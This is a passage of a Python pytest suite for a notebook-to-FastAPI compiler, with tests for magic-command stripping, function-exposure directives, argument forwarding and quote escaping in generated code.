    "/remainder", json={{"a": 10, "b": 3}},
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert response.status_code == 200, response.text
assert response.json() == {{"result": 1}}, response.json()

print("MODULO_CONTINUATION_LINE_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "MODULO_CONTINUATION_LINE_E2E_OK" in proc.stdout


def test_compiler_pipeline_preserves_a_backslash_continued_modulo_line(tmp_path):
    """The identical bug as
    test_compiler_pipeline_preserves_a_leading_modulo_continuation_line
    above, just continued via a trailing "\\" with no enclosing bracket
    at all instead -- a perfectly ordinary way to split a long expression
    without adding parens. strip_magic_commands' bracket-depth tracking
    never sees a bare "\\" (only an explicit "([{"/")]}" token), so it
    missed this case entirely before this fix: the continuation line's
    own leading "%" got silently commented out, discarding the entire
    modulo operation with no error anywhere. Verified against a real
    compiled app via TestClient, not just the generated source text.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def remainder(a: int, b: int) -> int:\n"
            "    total = a \\\n"
            "        % b\n"
            "    return total\n"
        )
    )

    notebook_path = tmp_path / "backslash_modulo.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
response = client.post(
    "/remainder", json={{"a": 10, "b": 3}},
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert response.status_code == 200, response.text
assert response.json() == {{"result": 1}}, response.json()

print("BACKSLASH_MODULO_CONTINUATION_LINE_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "BACKSLASH_MODULO_CONTINUATION_LINE_E2E_OK" in proc.stdout


def test_compiler_pipeline_does_not_expose_a_writefile_cells_own_function(tmp_path):
    """Confirmed exploitable before this fix: %%writefile writes its own
    cell body to a file instead of executing it in the notebook's own
    namespace -- a real Jupyter kernel never defines a function written
    this way at all, so a later cell calling it raises NameError. Before
    this fix, only the "%%writefile ..." line itself was commented out,
    leaving a syntactically-valid-Python body (the common real-world
    case) untouched and compiled straight into a real, working endpoint
    -- a fidelity gap between what the source notebook actually does and
    what got served, with no warning anywhere.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "%%writefile helper_module.py\n"
            "def greet(name: str) -> str:\n"
            "    return f'hello {name}'\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "writefile.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    app_source = (output_dir / "app.py").read_text(encoding="utf-8")

    assert '"/add"' in app_source
    assert "greet" not in app_source

    runtime_module = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")

    # The %%writefile cell's own body survives as inert, commented-out
    # text (the same "keep line numbers stable" treatment strip_magic_
    # commands already gives an ordinary magic line) -- what matters is
    # that it defines no live, callable top-level function.
    tree = ast.parse(runtime_module)
    top_level_function_names = {
        node.name for node in tree.body
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
    }
    assert "greet" not in top_level_function_names
    assert "add" in top_level_function_names


def test_compiler_pipeline_handles_a_leftover_introspection_query(tmp_path):
    """A cell left over from interactive exploration with a trailing
    ``func?``/``?func`` IPython introspection query (inline docstring/
    source lookup) must not lose the function(s) defined in that same
    cell -- before strip_magic_commands covered this syntax, `ast.parse`
    failed on the whole cell (it parses a cell as a single unit), so
    is_parseable_python dropped the entire cell, silently taking a
    perfectly good `train_model` down with it.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def train_model(epochs: int) -> str:\n"
            "    return f'trained for {epochs} epochs'\n\n"
            "train_model?\n"
        )
    )

    notebook_path = tmp_path / "introspection.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    runtime_module = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")

    ast.parse(runtime_module)
    assert "def train_model(epochs: int) -> str:" in runtime_module

    app_source = (output_dir / "app.py").read_text(encoding="utf-8")
    assert '@app.post("/train_model"' in app_source


def test_compiler_pipeline_does_not_expose_class_methods_or_nested_functions(
    tmp_path
):
    """A class method or a closure nested inside another function is not
    callable as a standalone module-level function, so it must not be
    turned into its own generated API endpoint.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "class Model:\n"
            "    def predict(self, x: int) -> int:\n"
            "        return x * 2\n\n"
            "def run(x: int) -> int:\n"
            "    def helper(y: int) -> int:\n"
            "        return y + 1\n"
            "    return helper(x)\n"
        )
    )

    notebook_path = tmp_path / "methods.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    assert '"/run"' in generated_app or "'/run'" in generated_app
    assert '"/predict"' not in generated_app
    assert '"/helper"' not in generated_app


def test_compiler_pipeline_deduplicates_functions_redefined_across_cells(
    tmp_path
):
    """Iteratively re-running a cell with a fixed version of the same
    function is a normal notebook workflow. The compiler must not
    register two conflicting routes for the same path -- FastAPI/Starlette
    would route every request to the *first*-registered one while the
    OpenAPI schema (dict-keyed by path) would document the *last*, so the
    served and documented behaviour would silently diverge.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    # fixed version\n"
            "    return a + b + 1\n"
        )
    )

    notebook_path = tmp_path / "redefined.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    assert generated_app.count('"/add"') == 1
    assert generated_app.count("def add(") == 1


def _add_and_subtract_notebook(tmp_path, filename="add_subtract.ipynb"):
    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
            "\n"
            "def subtract(a: int, b: int) -> int:\n"
            "    return a - b\n"
        )
    )

    notebook_path = tmp_path / filename

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    return notebook_path


def test_filter_functions_by_name_only_keeps_just_the_named_functions():

    functions = [{"name": "add"}, {"name": "subtract"}]

    filtered = _filter_functions_by_name(functions, only=["add"], exclude=None)

    assert [f["name"] for f in filtered] == ["add"]


def test_filter_functions_by_name_exclude_drops_just_the_named_functions():

    functions = [{"name": "add"}, {"name": "subtract"}]

    filtered = _filter_functions_by_name(functions, only=None, exclude=["subtract"])

    assert [f["name"] for f in filtered] == ["add"]


def test_filter_functions_by_name_with_neither_returns_everything_unchanged():

    functions = [{"name": "add"}, {"name": "subtract"}]

    filtered = _filter_functions_by_name(functions, only=None, exclude=None)

    assert filtered is functions


def test_filter_functions_by_name_rejects_only_and_exclude_together():

    with pytest.raises(ValueError, match="can't both be given"):
        _filter_functions_by_name(
            [{"name": "add"}], only=["add"], exclude=["add"]
        )


def test_filter_functions_by_name_rejects_an_unknown_only_name():

    with pytest.raises(ValueError, match="not defined in this notebook"):
        _filter_functions_by_name(
            [{"name": "add"}], only=["nope"], exclude=None
        )


def test_filter_functions_by_name_rejects_an_unknown_exclude_name():

    with pytest.raises(ValueError, match="not defined in this notebook"):
        _filter_functions_by_name(
            [{"name": "add"}], only=None, exclude=["nope"]
        )


def test_extract_private_function_names_matches_a_directive_immediately_above_a_def():

    code_cells = [
        "# notebook-to-api: private\ndef helper(x):\n    return x\n"
    ]

    assert _extract_private_function_names(code_cells) == {"helper"}


def test_extract_private_function_names_tolerates_blank_lines_between_directive_and_def():

    code_cells = [
        "# notebook-to-api: private\n\n\ndef helper(x):\n    return x\n"
    ]

    assert _extract_private_function_names(code_cells) == {"helper"}


def test_extract_private_function_names_tolerates_a_directive_stacked_above_it():
    """Confirmed exploitable before this: a "private" directive stacked
    with any other "# notebook-to-api: ..." directive on the same
    function (unlike a blank line) fell outside this pattern's own
    stacking allowance and silently failed to match at all -- the
    function still compiled into a public endpoint, with nothing to
    indicate its own "private" directive had been ignored.
    """

    code_cells = [
        "# notebook-to-api: private\n# notebook-to-api: tag Admin\n"
        "def helper(x):\n    return x\n"
    ]

    assert _extract_private_function_names(code_cells) == {"helper"}


def test_extract_private_function_names_matches_an_async_def():

    code_cells = [
        "# notebook-to-api: private\nasync def helper(x):\n    return x\n"
    ]

    assert _extract_private_function_names(code_cells) == {"helper"}


def test_extract_private_function_names_ignores_a_directive_with_no_following_def():

    code_cells = [
        "# notebook-to-api: private\nx = 1\n"
    ]

    assert _extract_private_function_names(code_cells) == set()


def test_extract_private_function_names_ignores_an_unrelated_comment():

    code_cells = [
        "# just a regular comment\ndef add(a, b):\n    return a + b\n"
    ]

    assert _extract_private_function_names(code_cells) == set()


def test_extract_private_function_names_only_marks_the_function_directly_below():

    code_cells = [
        "def add(a, b):\n    return a + b\n\n"
        "# notebook-to-api: private\n"
        "def helper(x):\n    return x\n"
    ]

    assert _extract_private_function_names(code_cells) == {"helper"}


def test_drop_private_functions_removes_the_marked_function():

    functions = [{"name": "add"}, {"name": "helper"}]
    code_cells = ["# notebook-to-api: private\ndef helper(x):\n    return x\n"]

    filtered, exclude = _drop_private_functions(functions, code_cells)

    assert [f["name"] for f in filtered] == ["add"]
    assert exclude is None


def test_drop_private_functions_with_no_directive_returns_functions_unchanged():

    functions = [{"name": "add"}]
    code_cells = ["def add(a, b):\n    return a + b\n"]

    filtered, exclude = _drop_private_functions(functions, code_cells, exclude=["add"])

    assert filtered is functions
    assert exclude == ["add"]


def test_drop_private_functions_rejects_only_naming_a_private_function():

    functions = [{"name": "add"}, {"name": "helper"}]
    code_cells = ["# notebook-to-api: private\ndef helper(x):\n    return x\n"]

    with pytest.raises(ValueError, match='"# notebook-to-api: private"'):
        _drop_private_functions(functions, code_cells, only=["helper"])


def test_drop_private_functions_treats_exclude_naming_a_private_function_as_a_no_op():
    """Naming an already-private function via `exclude` is redundant, not
    an error -- _filter_functions_by_name's own "not defined in this
    notebook" check would otherwise misfire once the function has
    already been dropped from `functions` by the time it runs.
    """

    functions = [{"name": "add"}, {"name": "helper"}]
    code_cells = ["# notebook-to-api: private\ndef helper(x):\n    return x\n"]

    filtered, exclude = _drop_private_functions(
        functions, code_cells, exclude=["helper"]
    )

    assert [f["name"] for f in filtered] == ["add"]
    assert exclude == []

    # The adjusted exclude must still compose cleanly with
    # _filter_functions_by_name -- no "not defined" error for a name
    # that's already gone.
    assert _filter_functions_by_name(filtered, only=None, exclude=exclude) == filtered


def test_extract_background_overrides_matches_a_background_directive():

    code_cells = [
        "# notebook-to-api: background\ndef regenerate_token():\n    return 1\n"
    ]

    assert _extract_background_overrides(code_cells) == {"regenerate_token": True}


def test_extract_background_overrides_matches_a_sync_directive():

    code_cells = [
        "# notebook-to-api: sync\ndef run_batch_inference():\n    return 1\n"
    ]

    assert _extract_background_overrides(code_cells) == {
        "run_batch_inference": False
    }


def test_extract_background_overrides_tolerates_a_directive_stacked_above_it():
    """Same silent-failure as private's own equivalent test above, for
    "background"/"sync" stacked with another directive.
    """

    code_cells = [
        "# notebook-to-api: background\n# notebook-to-api: tag Training\n"
        "def train_model(x):\n    return x\n"
    ]

    assert _extract_background_overrides(code_cells) == {"train_model": True}


def test_extract_background_overrides_tolerates_blank_lines_between_directive_and_def():

    code_cells = [
        "# notebook-to-api: background\n\n\ndef helper():\n    return 1\n"
    ]

    assert _extract_background_overrides(code_cells) == {"helper": True}


def test_extract_background_overrides_matches_an_async_def():

    code_cells = [
        "# notebook-to-api: sync\nasync def helper():\n    return 1\n"
    ]

    assert _extract_background_overrides(code_cells) == {"helper": False}


def test_extract_background_overrides_ignores_a_directive_with_no_following_def():

    code_cells = ["# notebook-to-api: background\nx = 1\n"]

    assert _extract_background_overrides(code_cells) == {}


def test_extract_background_overrides_ignores_an_unrelated_comment():

    code_cells = ["# just a regular comment\ndef add(a, b):\n    return a + b\n"]

    assert _extract_background_overrides(code_cells) == {}


def test_extract_background_overrides_collects_multiple_functions_across_cells():

    code_cells = [
        "# notebook-to-api: background\ndef regenerate_token():\n    return 1\n",
        "# notebook-to-api: sync\ndef run_batch_inference():\n    return 1\n",
    ]

    assert _extract_background_overrides(code_cells) == {
        "regenerate_token": True, "run_batch_inference": False,
    }


def test_extract_background_overrides_rejects_conflicting_directives_for_the_same_name():

    code_cells = [
        "# notebook-to-api: background\ndef helper():\n    return 1\n",
        "# notebook-to-api: sync\ndef helper():\n    return 1\n",
    ]

    with pytest.raises(ValueError, match="Conflicting"):
        _extract_background_overrides(code_cells)


def test_extract_background_overrides_tolerates_the_same_directive_repeated():
    """Not a conflict -- the identical directive for the same name, e.g.
    across two cells that both redefine the same function, agrees with
    itself.
    """

    code_cells = [
        "# notebook-to-api: background\ndef helper():\n    return 1\n",
        "# notebook-to-api: background\ndef helper():\n    return 2\n",
    ]

    assert _extract_background_overrides(code_cells) == {"helper": True}


def test_extract_deprecated_functions_matches_a_bare_directive():

    code_cells = [
        "# notebook-to-api: deprecated\ndef old_helper():\n    return 1\n"
    ]

    assert _extract_deprecated_functions(code_cells) == {"old_helper": None}


def test_extract_deprecated_functions_matches_a_directive_with_a_reason():

    code_cells = [
        "# notebook-to-api: deprecated: use old_helper_v2 instead\n"
        "def old_helper():\n    return 1\n"
    ]

    assert _extract_deprecated_functions(code_cells) == {
        "old_helper": "use old_helper_v2 instead"
    }


def test_extract_deprecated_functions_tolerates_blank_lines_between_directive_and_def():

    code_cells = [
        "# notebook-to-api: deprecated\n\n\ndef helper():\n    return 1\n"
    ]

    assert _extract_deprecated_functions(code_cells) == {"helper": None}


def test_extract_deprecated_functions_tolerates_a_directive_stacked_above_it():
    """Same silent-failure as private's own equivalent test above, for
    "deprecated" stacked with another directive.
    """

    code_cells = [
        "# notebook-to-api: deprecated: use v2\n# notebook-to-api: tag Legacy\n"
        "def old_fn():\n    return 1\n"
    ]

    assert _extract_deprecated_functions(code_cells) == {"old_fn": "use v2"}


def test_extract_deprecated_functions_matches_an_async_def():

    code_cells = [
        "# notebook-to-api: deprecated: slow now\nasync def helper():\n    return 1\n"
    ]

    assert _extract_deprecated_functions(code_cells) == {"helper": "slow now"}


def test_extract_deprecated_functions_ignores_a_directive_with_no_following_def():

    code_cells = ["# notebook-to-api: deprecated\nx = 1\n"]

    assert _extract_deprecated_functions(code_cells) == {}


def test_extract_deprecated_functions_ignores_an_unrelated_comment():

    code_cells = ["# just a regular comment\ndef add(a, b):\n    return a + b\n"]

    assert _extract_deprecated_functions(code_cells) == {}


def test_extract_deprecated_functions_collects_multiple_functions_across_cells():

    code_cells = [
        "# notebook-to-api: deprecated\ndef old_a():\n    return 1\n",
        "# notebook-to-api: deprecated: use new_b\ndef old_b():\n    return 1\n",
    ]

    assert _extract_deprecated_functions(code_cells) == {
        "old_a": None, "old_b": "use new_b",
    }


def test_extract_deprecated_functions_last_directive_wins_for_a_repeated_function():
    """Not a conflict, unlike a genuine background/sync mismatch -- the
    same "cell re-run with a tweaked reason" scenario
    test_extract_background_overrides_tolerates_the_same_directive_repeated
    covers for its own directive, just with the later reason winning
    instead of erroring, since there's no contradictory *other* value a
    deprecation reason could conflict with.
    """

    code_cells = [
        "# notebook-to-api: deprecated: first reason\ndef helper():\n    return 1\n",
        "# notebook-to-api: deprecated: second reason\ndef helper():\n    return 2\n",
    ]

    assert _extract_deprecated_functions(code_cells) == {"helper": "second reason"}


def test_compile_notebook_with_only_generates_an_endpoint_for_just_that_function(
    tmp_path
):
    """The generated app.py must expose exactly the requested function as
    an endpoint -- and no others -- while the excluded function must still
    be present and callable in the runtime module, since a compiled-out
    function may still be called internally by one that *is* exposed.
    """

    notebook_path = _add_and_subtract_notebook(tmp_path)
    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir), only=["add"])

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")
    runtime_module = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")

    assert '"/add"' in generated_app
    assert '"/subtract"' not in generated_app
    assert "def add(" in runtime_module
    assert "def subtract(" in runtime_module


def test_compile_notebook_with_exclude_omits_just_that_functions_endpoint(
    tmp_path
):

    notebook_path = _add_and_subtract_notebook(tmp_path)
    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir), exclude=["subtract"])

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    assert '"/add"' in generated_app
    assert '"/subtract"' not in generated_app


def test_compile_notebook_with_neither_only_nor_exclude_compiles_every_function(
    tmp_path
):
    """Preserves the previous, still-default behavior -- every top-level
    function becomes an endpoint when --only/--exclude aren't given.
    """

    notebook_path = _add_and_subtract_notebook(tmp_path)
    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    assert '"/add"' in generated_app
    assert '"/subtract"' in generated_app


def test_compile_notebook_never_exposes_a_private_directive_marked_function(tmp_path):
    """A function marked "# notebook-to-api: private" must never get its
    own endpoint -- but must still be present and callable in the
    runtime module, since a caller-exposed function may still call it
    internally, the same "still present, just not its own endpoint"
    contract --exclude already provides.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: private\n"
            "def helper(x: int) -> int:\n"
            "    return x * 2\n\n"
            "def add(a: int, b: int) -> int:\n"
            "    return helper(a) + helper(b)\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")
    runtime_module = (
        output_dir / "runtime" / "notebook_module.py"
    ).read_text(encoding="utf-8")

    assert '"/add"' in generated_app
    assert '"/helper"' not in generated_app
    assert "def helper(" in runtime_module


def test_compile_notebook_private_directive_still_applies_when_stacked_with_another(
    tmp_path,
):
    """The end-to-end version of
    test_extract_private_function_names_tolerates_a_directive_stacked_above_it:
    a "private" directive immediately followed by another directive (here
    "tag") on the same function must still keep it out of the compiled
    app, not silently expose it as a public endpoint.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: private\n"
            "# notebook-to-api: tag Admin\n"
            "def helper(x: int) -> int:\n"
            "    return x * 2\n\n"
            "def add(a: int, b: int) -> int:\n"
            "    return helper(a) + helper(b)\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    assert '"/add"' in generated_app
    assert '"/helper"' not in generated_app


def test_compile_notebook_sync_directive_overrides_a_long_running_keyword_match(
    tmp_path,
):
    """"regenerate_token" contains "generate" (a LONG_RUNNING_KEYWORDS
    match) but is genuinely fast -- "# notebook-to-api: sync" must force
    it into a real synchronous endpoint (no task_id, no BackgroundTasks),
    not the wrongly-inferred background one it would otherwise get.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: sync\n"
            "def regenerate_token(user_id: int) -> str:\n"
            "    return str(user_id)\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")
    readme = (output_dir / "README.md").read_text(encoding="utf-8")

    assert "_call_notebook_function(functools.partial(notebook_module.regenerate_token" in generated_app
    # The endpoint itself must be the plain synchronous shape -- no
    # task_id/BackgroundTasks wiring anywhere near its own definition.
    endpoint_source = generated_app.split("def regenerate_token", 1)[1]
    assert "task_id" not in endpoint_source.split("\n\n", 1)[0]
    assert "BackgroundTasks" not in endpoint_source.split("\n\n", 1)[0]
    assert "background task" not in readme.lower().split(
        "/regenerate_token"
    )[1].split("\n")[0]


def test_compile_notebook_background_directive_overrides_a_non_matching_name(
    tmp_path,
):
    """"run_batch_inference" matches none of LONG_RUNNING_KEYWORDS but is
    genuinely slow -- "# notebook-to-api: background" must force it into
    a real background/task_id endpoint, not the wrongly-inferred
    synchronous one it would otherwise get.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: background\n"
            "def run_batch_inference(count: int) -> int:\n"
            "    return count\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")
    readme = (output_dir / "README.md").read_text(encoding="utf-8")

    assert "def run_batch_inference" in generated_app
    endpoint_source = generated_app.split("def run_batch_inference", 1)[1]
    assert '"task_id": task_id, "status": "processing"' in (
        endpoint_source.split("\n\n", 1)[0]
    )
    assert "background task" in readme.lower().split(
        "/run_batch_inference"
    )[1].split("\n")[0]


def test_compile_notebook_conflicting_background_directives_is_a_clean_error(
    tmp_path,
):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: background\n"
            "def helper():\n"
            "    return 1\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: sync\n"
            "def helper():\n"
            "    return 2\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    with pytest.raises(ValueError, match="Conflicting"):
        compile_notebook(str(notebook_path), str(output_dir))


def test_compile_notebook_only_naming_a_private_function_is_a_clean_error(tmp_path):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: private\n"
            "def helper(x: int) -> int:\n"
            "    return x\n\n"
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    with pytest.raises(ValueError, match='"# notebook-to-api: private"'):
        compile_notebook(str(notebook_path), str(output_dir), only=["helper"])


def test_compile_notebook_only_and_exclude_together_is_a_clean_error(tmp_path):

    notebook_path = _add_and_subtract_notebook(tmp_path)
    output_dir = tmp_path / "generated"

    with pytest.raises(ValueError, match="can't both be given"):
        compile_notebook(
            str(notebook_path), str(output_dir), only=["add"], exclude=["subtract"]
        )


def test_compiler_pipeline_generates_awaitable_endpoint_for_async_function(
    tmp_path
):
    """`async def` functions are common in notebooks that call external
    APIs (httpx/aiohttp). Compiling one must produce a valid, importable
    generated app whose endpoint actually awaits the coroutine instead of
    returning it unresolved.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "async def fetch_data(url: str) -> dict:\n"
            "    return {'url': url}\n"
        )
    )

    notebook_path = tmp_path / "async_func.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)

    assert "async def fetch_data(" in generated_app
    assert "functools.partial(notebook_module.fetch_data, " in generated_app


def test_compiler_pipeline_calls_keyword_only_args_by_keyword(tmp_path):
    """`def train(data, *, epochs=10)` is a common ML-notebook signature.
    Keyword-only params must be forwarded as `epochs=req.epochs`, not
    positionally, or the generated endpoint raises a TypeError on every
    call.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def score(data: list, *, epochs: int = 10) -> dict:\n"
            "    return {'data': data, 'epochs': epochs}\n"
        )
    )

    notebook_path = tmp_path / "kwonly.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)

    assert "functools.partial(notebook_module.score, req.data, epochs=req.epochs)" in generated_app


def test_compiler_pipeline_positional_only_args_work_end_to_end(tmp_path):
    """Confirmed exploitable before this fix: positional-only params (those
    before a bare `/`) were dropped during extraction, so the generated
    endpoint called notebook_module.f(...) without them and every request
    raised a TypeError for missing required arguments.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def combine(a: int, b: int, /, c: int) -> int:\n"
            "    return a + b + c\n"
        )
    )

    notebook_path = tmp_path / "posonly.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)

    assert "functools.partial(notebook_module.combine, req.a, req.b, req.c)" in generated_app


def test_compiler_pipeline_zero_argument_function_compiles_end_to_end(tmp_path):
    """Confirmed exploitable before this fix: a zero-parameter notebook
    function produced an empty Pydantic model class body (no fields, no
    model_config), which is a SyntaxError -- app.py failed to even
    `compile()`, breaking every endpoint in the generated API, not just
    the zero-arg one.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def get_status() -> dict:\n"
            "    return {'ok': True}\n"
        )
    )

    notebook_path = tmp_path / "zeroarg.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)
    compile(generated_app, "app.py", "exec")


def test_compiler_pipeline_parameter_type_containing_a_quote_compiles_end_to_end(
    tmp_path,
):
    """Confirmed exploitable before this fix: a parameter's type
    annotation (ast.unparse'd from the notebook's own source -- e.g.
    Literal["a\\"quoted\\"value"] unparses to Literal['a"quoted"value'])
    is arbitrary, notebook-author-controlled text that can itself
    legitimately contain a double quote. That quote was embedded as a
    raw f-string inside a hand-written description="..." literal for the
    generated Pydantic Field, closing the string early and corrupting
    the rest of the line into a SyntaxError that failed to compile the
    *entire* generated app.py, not just this one parameter.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "from typing import Literal\n\n"
                            'def classify(label: Literal["a\\"quoted\\"value"]) -> str:\n'
                            "    return label\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

resp = client.post("/classify", json={{"label": 'a"quoted"value'}}, headers=headers)
assert resp.status_code == 200, resp.text
assert resp.json() == {{"result": 'a"quoted"value'}}, resp.json()

schema = app.openapi()
field_description = schema["components"]["schemas"]["ClassifyRequest"]["properties"]["label"]["description"]
assert field_description == "Parameter 'label' of type Literal['a\\"quoted\\"value']", field_description

print("QUOTED_PARAMETER_TYPE_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "QUOTED_PARAMETER_TYPE_E2E_OK" in proc.stdout


def test_compiler_pipeline_return_type_containing_a_quote_compiles_end_to_end(
    tmp_path,
):
    """Mirrors
    test_compiler_pipeline_parameter_type_containing_a_quote_compiles_end_to_end
    for a *return* type annotation, which flows into an endpoint's own
    responses={{200: {{"description": ...}}}} entry (response_description
    for a synchronous endpoint, task_response_description for a
    background one) through the exact same unescaped-embedding hazard.
    Covers both code paths in one notebook, since each builds this
    description differently.
